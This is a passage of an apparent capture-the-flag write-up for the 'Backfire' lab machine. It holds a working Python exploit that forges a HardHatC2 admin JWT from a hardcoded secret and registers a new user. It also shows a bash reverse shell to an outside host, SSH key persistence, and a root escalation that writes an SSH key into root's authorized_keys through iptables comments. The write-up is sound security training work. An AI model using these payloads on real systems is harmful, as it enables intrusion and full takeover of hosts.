ilya@backfire:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDLe30SIt4ehPSdr4JIuZdQRoWmPo3p6txvjK9OcYC9wTvyDeI2emq63QE+YkqatnXJfLJhgEPXRzXltVrO6KGE3PMoyarwHC6NvDx9Fsjl2oSs0/XqUuSz+nkXWmjUgqP4I7SQar7n6lPBwQBUqnQvhrAZQYlDs4ibsiho0c+VnjJu385eSl8AshVZzf/mMkgvMcs2+NLGpbxbsaErLkBikKNA2OdN03SNLcdReIyLYaYMO2c6IJxK3TnPKvugiZIObYR5Wnvi8ZacqR4DqdfGu4PO8Mw+lyqKRRQNLB5rCK1R47HnRvpnTniR+RA9lT5zh+Wt1F6IBJYow7+zUQqk2+KEMF3Bi4QfYy2nBN7tq7dQMUC5kwOuF7JEnzbBCFAQuLy4TMzVa7LMO6tM+sKHWa9oXt2elvqo5kf4OJL4t2Q04797+3T2tdxDBptLTHG9YtLX+nMWTMIZAE4ia8m/4CJblFmoq2V9F01JeI6cphikXjLk+8yms3QQnPRGJZWo1bFcFvVpyvffhjxYoumWIryOkWs4Hajo+IfOiVrHtpzGSsOUw475yPTG9K6Y1NIxegv62HfzK3+jpMmSrz7wU6qDtEh724XQqaG2NWum3EcrZMJokb8YBeH8SLJtczcfMo4AWB5NXncpZC4+JFu+aT4QY7xrFANsDcNUbsPmqw==" >> authorized_keys
<C4+JFu+aT4QY7xrFANsDcNUbsPmqw==" >> authorized_keys
```

```c
┌──(kali㉿kali)-[~]
└─$ ssh ilya@10.129.83.139
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
ilya@backfire:~$
```

## user.txt

We grabbed the `user.txt` and proceeded with the `enumeration`.

```c
ilya@backfire:~$ cat user.txt 
4f2740d2d268134abdf7e788035e4bc9
```

## Enumeration

The `enumeration` showed a few groups and only the second user which we already knew from the `havoc.yaotl`.

```c
ilya@backfire:~$ id
uid=1000(ilya) gid=1000(ilya) groups=1000(ilya),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

```c
ilya@backfire:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
ilya:x:1000:1000:ilya,,,:/home/ilya:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
sergej:x:1001:1001:,,,:/home/sergej:/bin/bash
_laurel:x:999:996::/var/log/laurel:/bin/false
```

But in the `home directory` we found a `note` about another `C2` called `HardHatC2`.

```c
ilya@backfire:~$ ls -la
ls -la
total 40
drwx------  5 ilya ilya 4096 Dec 12 10:14 .
drwxr-xr-x  4 root root 4096 Sep 28 20:05 ..
lrwxrwxrwx  1 root root    9 Dec 12 10:14 .bash_history -> /dev/null
-rw-r--r--  1 ilya ilya  220 Sep 27 16:43 .bash_logout
-rw-r--r--  1 ilya ilya 3526 Sep 27 16:43 .bashrc
drwxr-xr-x  2 root root 4096 Sep 30 07:39 files
-rw-r--r--  1 root root  174 Sep 28 23:02 hardhat.txt
drwxr-xr-x 10 ilya ilya 4096 Sep 27 19:18 Havoc
-rw-r--r--  1 ilya ilya  807 Sep 27 16:43 .profile
drwxr-xr-x  2 ilya ilya 4096 Dec 12 10:01 .ssh
-rw-r-----  1 root ilya   33 Jan 18 14:02 user.txt
```

```c
ilya@backfire:~$ cat hardhat.txt
cat hardhat.txt
Sergej said he installed HardHatC2 for testing and  not made any changes to the defaults
I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C#
```

So we checked the locally available ports and found port `7096/TCP` open which is the default port for `HardHatC2`.

```c
ilya@backfire:~$ ss -tulpn
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                   
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                              0.0.0.0:8000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:40056                                           0.0.0.0:*                                                
tcp                     LISTEN                   0                        512                                              0.0.0.0:5000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        512                                              0.0.0.0:7096                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:8443                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                              0.0.0.0:443                                             0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*
```

## Privilege Escalation to sergej

### HardHatC2

In order to achieve `privilege escalation` we forwarded port `7096/TCP` and tried to access the `dashboard` of `HardHatC2` with the credentials we already had.

- [https://github.com/DragoQCC/HardHatC2](https://github.com/DragoQCC/HardHatC2)

```c
┌──(kali㉿kali)-[~]
└─$ ssh -L 7096:localhost:7096 ilya@10.129.83.139
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Dec 17 11:30:51 2024 from 10.10.14.91
ilya@backfire:~$
```

- [https://localhost:7096/](https://localhost:7096/)

![](images/2025-01-19_15-47_hardhatc2_login.png)

Unfortunately this time they didn't worked on the `C2`.

#### Authentication Bypass

After some research we found a `blog post` related to some interesting `vulnerabilities` of `HardHatC2`. One of them described a `hardcoded secret` which allows an attacker to forge not only a custom `JSON Web Token (JWT)`, it also grants the ability to `create` new users.

- [https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7?gi=29bab46a031f](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7?gi=29bab46a031f)

```c
# @author Siam Thanat Hack Co., Ltd. (STH)  
import jwt  
import datetime  
import uuid  
import requests  
  
rhost = 'hardhatc2.local:5000'  
  
# Craft Admin JWT  
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"  
issuer = "hardhatc2.com"  
now = datetime.datetime.utcnow()  
  
expiration = now + datetime.timedelta(days=28)  
payload = {  
    "sub": "HardHat_Admin",    
    "jti": str(uuid.uuid4()),  
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",  
    "iss": issuer,  
    "aud": issuer,  
    "iat": int(now.timestamp()),  
    "exp": int(expiration.timestamp()),  
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"  
}  
  
token = jwt.encode(payload, secret, algorithm="HS256")  
print("Generated JWT:")  
print(token)  
  
# Use Admin JWT to create a new user 'sth_pentest' as TeamLead  
burp0_url = f"https://{rhost}/Login/Register"  
burp0_headers = {  
  "Authorization": f"Bearer {token}",  
  "Content-Type": "application/json"  
}  
burp0_json = {  
  "password": "sth_pentest",  
  "role": "TeamLead",  
  "username": "sth_pentest"  
}  
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)  
print(r.text)
```

We forwarded port `5000/TCP` and executed the `PoC` from the `article`.

```c
┌──(kali㉿kali)-[~]
└─$ ssh -L 5000:127.0.0.1:5000 ilya@10.129.83.139
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
ilya@backfire:~$
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Backfire/files]
└─$ cat generate_token.py 
# @author Siam Thanat Hack Co., Ltd. (STH)
import jwt
import datetime
import uuid
import requests

rhost = '127.0.0.1:5000'

# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)

# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "sth_pentest",
  "role": "TeamLead",
  "username": "sth_pentest"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
```

In the output we noticed `"User sth_pentest created"`. With the corresponding `password` we tried to login and luckily for us, it worked.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Backfire/files]
└─$ python3 generate_token.py 
/media/sf_cybersecurity/notes/HTB/Machines/Backfire/files/generate_token.py:12: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
Generated JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJIYXJkSGF0X0FkbWluIiwianRpIjoiOTY5N2EwMDUtY2UwNC00OThjLTg2ZmMtYzVmYWNjNjNmMzVkIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvbmFtZWlkZW50aWZpZXIiOiIxIiwiaXNzIjoiaGFyZGhhdGMyLmNvbSIsImF1ZCI6ImhhcmRoYXRjMi5jb20iLCJpYXQiOjE3MzcyOTc2MzIsImV4cCI6MTczOTcxNjgzMiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiQWRtaW5pc3RyYXRvciJ9.X_sy1WtAcaaEdjj42vQvOB__07sHDbkcPrzMlcXORok
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1099: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
User sth_pentest created
```

| Username    | Password    |
| ----------- | ----------- |
| sth_pentest | sth_pentest |

![](images/2025-01-19_16-42_hardhatc2_dashboard.png)

#### Remote Code Execution (RCE)

As next step we searched for a way to interact with the box. We moved to the tab to `interact` with the `implant` and executed a simple `id` command as well as a `ping callback` to our local machine to confirm `code execution`.

- [https://localhost:7096/ImplantInteract](https://localhost:7096/ImplantInteract)

![](images/2025-01-19_16-45_hardhatc2_implant_interact.png)

![](images/2025-01-19_16-46_hardhatc2_implant_interact_code_execution.png)

```c
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -envi tun0 icmp
[sudo] password for kali: 
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:45:55.039999 ip: (tos 0x0, ttl 63, id 3961, offset 0, flags [DF], proto ICMP (1), length 84)
    10.129.83.139 > 10.10.14.91: ICMP echo request, id 47698, seq 1, length 64
16:45:55.040024 ip: (tos 0x0, ttl 64, id 15620, offset 0, flags [none], proto ICMP (1), length 84)
    10.10.14.91 > 10.129.83.139: ICMP echo reply, id 47698, seq 1, length 64
16:45:56.041980 ip: (tos 0x0, ttl 63, id 4206, offset 0, flags [DF], proto ICMP (1), length 84)
    10.129.83.139 > 10.10.14.91: ICMP echo request, id 47698, seq 2, length 64
16:45:56.042006 ip: (tos 0x0, ttl 64, id 15740, offset 0, flags [none], proto ICMP (1), length 84)
    10.10.14.91 > 10.129.83.139: ICMP echo reply, id 47698, seq 2, length 64
16:45:57.044046 ip: (tos 0x0, ttl 63, id 4413, offset 0, flags [DF], proto ICMP (1), length 84)
    10.129.83.139 > 10.10.14.91: ICMP echo request, id 47698, seq 3, length 64
16:45:57.044072 ip: (tos 0x0, ttl 64, id 15909, offset 0, flags [none], proto ICMP (1), length 84)
    10.10.14.91 > 10.129.83.139: ICMP echo reply, id 47698, seq 3, length 64
```

After our successful tests we executed a simple `reverse shell` payload and catched the `shell` as the second user.

```c
bash -c '/bin/bash -i >& /dev/tcp/10.10.14.91/4444 0>&1'
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.91] from (UNKNOWN) [10.129.83.139] 33590
bash: cannot set terminal process group (47410): Inappropriate ioctl for device
bash: no job control in this shell
sergej@backfire:~/HardHatC2/HardHatC2Client$
```

## Persistence

Again, for `persistence` and to have a proper shell we added our `SSH key` to the `authorized_keys` file.

```c
sergej@backfire:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDLe30SIt4ehPSdr4JIuZdQRoWmPo3p6txvjK9OcYC9wTvyDeI2emq63QE+YkqatnXJfLJhgEPXRzXltVrO6KGE3PMoyarwHC6NvDx9Fsjl2oSs0/XqUuSz+nkXWmjUgqP4I7SQar7n6lPBwQBUqnQvhrAZQYlDs4ibsiho0c+VnjJu385eSl8AshVZzf/mMkgvMcs2+NLGpbxbsaErLkBikKNA2OdN03SNLcdReIyLYaYMO2c6IJxK3TnPKvugiZIObYR5Wnvi8ZacqR4DqdfGu4PO8Mw+lyqKRRQNLB5rCK1R47HnRvpnTniR+RA9lT5zh+Wt1F6IBJYow7+zUQqk2+KEMF3Bi4QfYy2nBN7tq7dQMUC5kwOuF7JEnzbBCFAQuLy4TMzVa7LMO6tM+sKHWa9oXt2elvqo5kf4OJL4t2Q04797+3T2tdxDBptLTHG9YtLX+nMWTMIZAE4ia8m/4CJblFmoq2V9F01JeI6cphikXjLk+8yms3QQnPRGJZWo1bFcFvVpyvffhjxYoumWIryOkWs4Hajo+IfOiVrHtpzGSsOUw475yPTG9K6Y1NIxegv62HfzK3+jpMmSrz7wU6qDtEh724XQqaG2NWum3EcrZMJokb8YBeH8SLJtczcfMo4AWB5NXncpZC4+JFu+aT4QY7xrFANsDcNUbsPmqw==" > authorized_keys
<ZC4+JFu+aT4QY7xrFANsDcNUbsPmqw==" > authorized_keys
```

```c
┌──(kali㉿kali)-[~]
└─$ ssh sergej@10.129.83.139
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
sergej@backfire:~$
```

## Pivoting

Right after we logged in using `SSH` we noticed that we had the ability to execute two `iptables` commands as `sudo` which indicated the `privilege escalation vector` to get `root`.

```c
sergej@backfire:~$ id
uid=1001(sergej) gid=1001(sergej) groups=1001(sergej),100(users)
```

```c
sergej@backfire:~$ sudo -l
Matching Defaults entries for sergej on backfire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save
```

## Privilege Escalation to root

A quick research and we found an article which described the `Local Privilege Escalation (LPE)` using a `misconfiguration` of `iptables` using `sudo`. It abuses the `option` for `comments` while adding `rules` and then `saving` them in a `file`. A carefully with `new lines` forged `comment` which contains a `SSH public key` saved as `authorized_keys` get's parsed properly by `SSH` and allows `unauthorized access`.

- [https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/)

We added our `Elliptic Curve Cryptograph (ECC)` based `SSH keys` closed by `\n` aka `new lines` as `comment` to the `INPUT chain`.

```c
sergej@backfire:~$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGk6KVVXiGXxGP51sZBxIdgKFLi9wO46TpY/szJC3HIU\n'
```

A quick look at the available `rules` showed that the `SSH key` was added properly.

```c
sergej@backfire:~$ sudo iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i lo -m comment --comment "
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGk6KVVXiGXxGP51sZBxIdgKFLi9wO46TpY/szJC3HIU
" -j ACCEPT
```

We saved the `ruleset` as `authorized_keys` file for `root` and logged in.

```c
sergej@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```

## root.txt

```c
root@backfire:~# cat /root/root.txt
69d0becd0e28ab94182198104c066a2f
```
